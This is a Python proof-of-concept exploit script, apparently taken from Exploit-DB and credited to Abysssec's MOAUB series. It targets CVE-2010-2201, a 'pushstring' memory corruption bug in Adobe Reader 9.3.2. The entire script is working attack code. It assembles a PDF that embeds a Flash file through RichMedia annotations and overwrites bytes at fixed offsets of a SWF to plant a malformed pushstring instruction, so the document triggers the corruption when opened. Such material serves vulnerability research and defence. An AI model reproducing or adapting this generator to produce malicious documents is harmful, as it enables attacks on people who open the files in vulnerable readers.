'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

http://www.exploit-db.com/moaub12-adobe-acrobat-and-reader-pushstring-memory-corruption/
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/14982.zip (moaub-12-exploit.zip)
'''

'''
  Title             :  Adobe Acrobat and Reader "pushstring" Memory Corruption
  Version           :  Adobe Reader 9.3.2
  Analysis         :  http://www.abysssec.com
  Vendor            :  http://www.adobe.com
  Impact            :  Med/High
  Contact           :  shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           :  @abysssec
  CVE               :  CVE-2010-2201
  MOAUB Number      :  MOAUB-10
'''

import sys

class PDF:
     
	def __init__(self):
		self.xrefs = []
		self.eol = '\x0a'
		self.content = ''
		self.xrefs_offset = 0
		
	def header(self):
		self.content += '%PDF-1.6' + self.eol
		
	def obj(self, obj_num, data,flag):
		self.xrefs.append(len(self.content))
		self.content += '%d 0 obj' % obj_num
		if flag == 1:
			self.content += self.eol + '<< ' + data + ' >>' + self.eol
		else:
			self.content += self.eol + data + self.eol
		self.content += 'endobj' + self.eol

	def obj_SWFStream(self, obj_num, data, stream):
		self.xrefs.append(len(self.content))
		self.content += '%d 0 obj' % obj_num
		self.content += self.eol + '<< ' + data + '/Params << /Size %d >> /DL %d /Length %d' %(len(stream),len(stream),len(stream))
		self.content += ' >>' + self.eol
		self.content += 'stream' + self.eol + stream + self.eol + 'endstream' + self.eol
		self.content += 'endobj' + self.eol
	
	def obj_Stream(self, obj_num, data, stream):
		self.xrefs.append(len(self.content))
		self.content += '%d 0 obj' % obj_num
		self.content += self.eol + '<< ' + data + '/Length %d' %len(stream)
		self.content += ' >>' + self.eol
		self.content += 'stream' + self.eol + stream + self.eol + 'endstream' + self.eol
		self.content += 'endobj' + self.eol
		
	def ref(self, ref_num):
		return '%d 0 R' % ref_num
		
	def xref(self):
		self.xrefs_offset = len(self.content)
		self.content += 'xref' + self.eol
		self.content += '0 %d' % (len(self.xrefs) + 1)
		self.content += self.eol
		self.content += '0000000000 65535 f' + self.eol
		for i in self.xrefs:
			self.content += '%010d 00000 n' % i
			self.content += self.eol
    
	def trailer(self):
		self.content += 'trailer' + self.eol
		self.content += '<< /Size %d' % (len(self.xrefs) + 1)
		self.content += ' /Root ' + self.ref(1) + ' >> ' + self.eol
		self.content += 'startxref' + self.eol
		self.content += '%d' % self.xrefs_offset
		self.content += self.eol
		self.content += '%%EOF'
		
	def generate(self):
		return self.content


		
		
class POC:

    def getSWF(self):
        try:
            fdR = open('flash.swf', 'rb+')
            strTotal = fdR.read()		
            str1 = strTotal[:479]
			
            command = '\x2C\xE8\x88\xF0\xFF\x33'   #pushstring
			
            str2 = strTotal[485:]
			
            fdW= open('poc.swf', 'wb+')
            finalStr = str1+command+str2
            fdW.write(finalStr)	
            
            fdR.close()
            return finalStr
            
        except IOError:
            print '[*] Error : An IO error has occurred'
		

def generate_pdf():
	poc = POC()
	swfFile = 'poc.swf'
	pdf = PDF()
	pdf.header()
	pdf.obj(1, '/MarkInfo<</Marked true>>/Type /Catalog/Pages ' + pdf.ref(2) ,1)
	pdf.obj(2, '/Count 1/Type/Pages/Kids[ '+pdf.ref(3)+' ]',1)
	pdf.obj(3, '/Annots [ '+pdf.ref(5) +' ]/Parent '+pdf.ref(2) + " /Type/Page"+' /Contents '+pdf.ref(4) ,1)
	pdf.obj_Stream(4, '','')
	pdf.obj(5, '/RichMediaSettings '+pdf.ref(6)+' /NM ( ' + swfFile + ' ) /Subtype /RichMedia /Type /Annot /RichMediaContent '+pdf.ref(7)+' /Rect [ 266 116 430 204 ]',1)
	pdf.obj(6, '/Subtype /Flash /Activation '+pdf.ref(8)+' /Type /RichMediaSettings /Deactivation '+pdf.ref(9),1)  
	pdf.obj(7, '/Type /RichMediaContent /Assets '+pdf.ref(10) +' /Configurations [ ' + pdf.ref(11) + ']',1)
	pdf.obj(8, '/Type /RichMediaActivation /Condition /PO ',1)	
	pdf.obj(9, '/Type /RichMediaDeactivation /Condition /XD ',1)	
	pdf.obj(10, '/Names [('+ swfFile +') ' + pdf.ref(12)+' ]',1)	
	pdf.obj(11, '/Subtype /Flash /Type /RichMediaConfiguration /Name (ElFlash) /Instances [ '+pdf.ref(13) +' ]',1)	
	pdf.obj(12, '/EF <</F '+pdf.ref(14) +' >> /Type /Filespec /F ('+ swfFile +')',1)	
	pdf.obj(13, '/Subype /Flash /Params '+pdf.ref(15) +' /Type /RichMediaInstance /Asset '+ pdf.ref(12) ,1)
	pdf.obj_SWFStream(14, ' /Type /EmbeddedFile  ',poc.getSWF() )  
	pdf.obj(15, '/Binding /Background /Type /RichMediaParams /FlashVars () /Settings '+pdf.ref(16),1)
	pdf.obj_Stream(16, '<</Length 0 >> ','')  
	
	
	pdf.xref()
	pdf.trailer()
	return pdf.generate()
	
def main():
	if len(sys.argv) != 2:
		print 'Usage: python %s [output file name]' % sys.argv[0]
		sys.exit(0)
	file_name = sys.argv[1]
	if not file_name.endswith('.pdf'):
		file_name = file_name + '.pdf'
	try:
		fd = open(file_name, 'wb+')
		fd.write(generate_pdf())
		fd.close()
		print '[-] PDF file generated and written to %s' % file_name
	except IOError:
		print '[*] Error : An IO error has occurred'
		print '[-] Exiting ...'
		sys.exit(-1)
if __name__ == '__main__':
	main()